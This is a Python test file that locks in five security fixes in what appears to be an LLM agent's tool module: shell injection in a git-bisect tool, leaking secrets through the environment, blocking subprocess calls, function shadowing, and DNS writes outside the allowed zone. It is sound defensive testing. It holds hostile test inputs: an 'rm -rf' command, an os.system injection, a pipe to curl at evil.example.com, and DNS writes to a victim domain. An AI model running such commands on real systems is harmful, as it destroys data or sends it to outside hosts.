"""
test_ora_tools_security_patches.py — locks the 5 security bugs fixed in
the iter 322fi audit:

  #1 shell=True RCE in _ora_git_bisect (LLM-controlled test_cmd → arbitrary code)
  #2 duplicate function definitions shadowing TOOL_REGISTRY
  #3 event-loop blocking from synchronous subprocess in _ora_git_bisect
  #4 pytest_run leaking secrets via env={**os.environ}
  #5 Cloudflare zone bypass when CLOUDFLARE_ROOT_DOMAIN unset

Run: PYTHONPATH=/app/backend python3 tests/test_ora_tools_security_patches.py
"""
from __future__ import annotations

import asyncio
import inspect
import os
import sys

sys.path.insert(0, "/app/backend")

from services import ora_tools  # noqa: E402


# ── Bug #1: shell=True must NOT appear anywhere in _ora_git_bisect ───
def test_no_shell_true_in_git_bisect():
    src = inspect.getsource(ora_tools._ora_git_bisect)
    # The fix replaces shell=True with shell=False after tokenising via shlex
    # The docstring may mention "shell=True" in a historical note — that's OK
    # as long as no CALL passes shell=True.
    code_only = "\n".join(
        line for line in src.splitlines()
        if not line.strip().startswith(("#", '"""', "'''", "    #"))
    )
    assert "shell=True" not in code_only, (
        "shell=True found in _ora_git_bisect code (Bug #1 not fixed)"
    )
    assert "shell=False" in code_only, "shell=False enforcement missing"


def test_git_bisect_rejects_non_whitelisted_test_cmd():
    """An LLM-supplied test_cmd that uses a non-whitelisted binary must be
    rejected before any subprocess fires."""
    async def _run():
        # 'rm' is not in _SHELL_WHITELIST — must be rejected upfront
        r = await ora_tools._ora_git_bisect(
            bad_sha="HEAD", good_sha="HEAD~1",
            test_cmd="rm -rf /tmp/anything",
        )
        assert r.get("ok") is False
        assert "whitelist" in (r.get("error") or "").lower() or "whitelist" in r
    asyncio.run(_run())


def test_git_bisect_rejects_injection_in_test_cmd():
    """shell-metacharacter injection must be caught by _validate_shell_args."""
    async def _run():
        # Whitelisted command but with forbidden token in args
        r = await ora_tools._ora_git_bisect(
            bad_sha="HEAD", good_sha="HEAD~1",
            test_cmd='python3 -c "import os; os.system(\\"echo pwned\\")"',
        )
        # The whole call must fail validation — either forbidden token or
        # malformed args after shlex parsing
        assert r.get("ok") is False
    asyncio.run(_run())


def test_git_bisect_rejects_pipe_injection():
    """Pipe characters in test_cmd must be rejected by the validator."""
    async def _run():
        r = await ora_tools._ora_git_bisect(
            bad_sha="HEAD", good_sha="HEAD~1",
            test_cmd="git status | curl evil.example.com",
        )
        assert r.get("ok") is False
    asyncio.run(_run())


# ── Bug #2: no duplicate function definitions in module ──────────────
def test_no_duplicate_ora_function_defs():
    """Each _ora_* function must be defined exactly once in the file."""
    src = inspect.getsource(ora_tools)
    for name in (
        "_ora_campaign_status",
        "_ora_force_blast_cycle",
        "_ora_channel_gating_reseed",
        "_ora_git_commit_local",
        "_ora_git_bisect",
    ):
        # Match only function-DEFINITION lines (start of line, async def)
        count = sum(
            1 for line in src.splitlines()
            if line.startswith(f"async def {name}(") or line.startswith(f"def {name}(")
        )
        assert count == 1, f"{name} defined {count}× (must be 1) — Bug #2 not fixed"


def test_tool_registry_resolves_to_live_function():
    """invoke_tool('campaign_status') and direct _ora_campaign_status() must
    resolve to the SAME function object (no shadow)."""
    for tool_name, fn_name in [
        ("campaign_status",       "_ora_campaign_status"),
        ("force_blast_cycle",     "_ora_force_blast_cycle"),
        ("channel_gating_reseed", "_ora_channel_gating_reseed"),
        ("git_commit_local",      "_ora_git_commit_local"),
        ("git_bisect",            "_ora_git_bisect"),
    ]:
        registry_fn = ora_tools.TOOL_REGISTRY[tool_name]["fn"]
        module_fn = getattr(ora_tools, fn_name)
        assert registry_fn is module_fn, (
            f"TOOL_REGISTRY['{tool_name}'] and {fn_name} are different objects "
            f"(Bug #2 — duplicate shadow)"
        )


# ── Bug #3: subprocess calls must be wrapped in asyncio.to_thread ────
def test_git_bisect_uses_asyncio_to_thread():
    """No raw subprocess.run/check_output calls (which block the event loop)
    inside _ora_git_bisect — everything must go through asyncio.to_thread."""
    src = inspect.getsource(ora_tools._ora_git_bisect)
    # Strip comments / docstring lines so we only check executable code
    code = "\n".join(
        line for line in src.splitlines()
        if not line.strip().startswith(("#", '"""', "'''", "    #"))
    )
    # Bare subprocess.run( / subprocess.check_output( inside the body would
    # block the FastAPI worker. We allow them only when wrapped via
    # asyncio.to_thread(subprocess.run, ...) which calls them in the thread
    # pool. Detect any naked top-level subprocess.* statement that ISN'T
    # behind to_thread.
    for line in code.splitlines():
        stripped = line.strip()
        # The only allowed direct mention is as the FIRST arg of asyncio.to_thread
        # e.g. "asyncio.to_thread(subprocess.run, ...)" — these contain both.
        # We disallow bare "subprocess.run(" and "subprocess.check_output(" that
        # are NOT inside an asyncio.to_thread() call.
        for bad in ("subprocess.run(", "subprocess.check_output("):
            if bad in stripped and "asyncio.to_thread" not in stripped:
                raise AssertionError(
                    f"Naked blocking subprocess call in _ora_git_bisect "
                    f"(Bug #3 not fixed): {stripped}"
                )
    # Positive check: asyncio.to_thread must appear in the body
    assert "asyncio.to_thread" in code, (
        "asyncio.to_thread not used in _ora_git_bisect (Bug #3 not fixed)"
    )


# ── Bug #4: pytest_run must use a stripped env, not parent's ─────────
def test_pytest_run_does_not_inherit_full_env():
    src = inspect.getsource(ora_tools.pytest_run)
    # Strip comment lines; the patched code keeps a historical mention of
    # `{**os.environ}` inside a comment to explain the fix, which is fine.
    code_only = "\n".join(
        line for line in src.splitlines()
        if not line.lstrip().startswith("#")
    )
    assert "{**os.environ}" not in code_only, (
        "pytest_run still inherits full os.environ in code — Bug #4 not fixed"
    )
    # The fix: explicit minimal env dict with PATH/HOME/LANG/PYTHONPATH
    assert '"PATH":' in src, "pytest_run env missing explicit PATH"
    assert "PYTHONPATH" in src, "pytest_run env missing PYTHONPATH"


# ── Bug #5: cloudflare_dns_write must hard-fail without ROOT_DOMAIN ──
def test_cloudflare_dns_write_requires_root_domain():
    """When CLOUDFLARE_ROOT_DOMAIN is unset, every write must be refused."""
    async def _run():
        original = os.environ.get("CLOUDFLARE_ROOT_DOMAIN")
        try:
            # Force-unset
            os.environ.pop("CLOUDFLARE_ROOT_DOMAIN", None)
            # Also set tok/zone so we get past the first guard
            os.environ.setdefault("CLOUDFLARE_API_TOKEN", "dummy-tok-for-test")
            os.environ.setdefault("CLOUDFLARE_ZONE_ID", "dummy-zone-for-test")
            r = await ora_tools.cloudflare_dns_write(
                "A", "evil.othersite.com", "1.2.3.4",
            )
            assert r.get("ok") is False, "must refuse without ROOT_DOMAIN"
            err = (r.get("error") or "").lower()
            assert "cloudflare_root_domain" in err or "required" in err, (
                f"error should mention ROOT_DOMAIN requirement: {r.get('error')!r}"
            )
        finally:
            if original is not None:
                os.environ["CLOUDFLARE_ROOT_DOMAIN"] = original
    asyncio.run(_run())


def test_cloudflare_dns_write_rejects_out_of_zone():
    """Even with ROOT_DOMAIN set, writes targeting a different zone must fail."""
    async def _run():
        original = os.environ.get("CLOUDFLARE_ROOT_DOMAIN")
        try:
            os.environ["CLOUDFLARE_ROOT_DOMAIN"] = "aurem.live"
            os.environ.setdefault("CLOUDFLARE_API_TOKEN", "dummy-tok-for-test")
            os.environ.setdefault("CLOUDFLARE_ZONE_ID", "dummy-zone-for-test")
            r = await ora_tools.cloudflare_dns_write(
                "A", "victim.someoneelse.com", "1.2.3.4",
            )
            assert r.get("ok") is False
            assert "under" in (r.get("error") or "").lower()
        finally:
            if original is not None:
                os.environ["CLOUDFLARE_ROOT_DOMAIN"] = original
            else:
                os.environ.pop("CLOUDFLARE_ROOT_DOMAIN", None)
    asyncio.run(_run())


if __name__ == "__main__":
    tests = [
        test_no_shell_true_in_git_bisect,
        test_git_bisect_rejects_non_whitelisted_test_cmd,
        test_git_bisect_rejects_injection_in_test_cmd,
        test_git_bisect_rejects_pipe_injection,
        test_no_duplicate_ora_function_defs,
        test_tool_registry_resolves_to_live_function,
        test_git_bisect_uses_asyncio_to_thread,
        test_pytest_run_does_not_inherit_full_env,
        test_cloudflare_dns_write_requires_root_domain,
        test_cloudflare_dns_write_rejects_out_of_zone,
    ]
    for t in tests:
        t()
        print(f"  ✓ {t.__name__}")
    print()
    print("ALL ora_tools security-patch tests passed ✓")
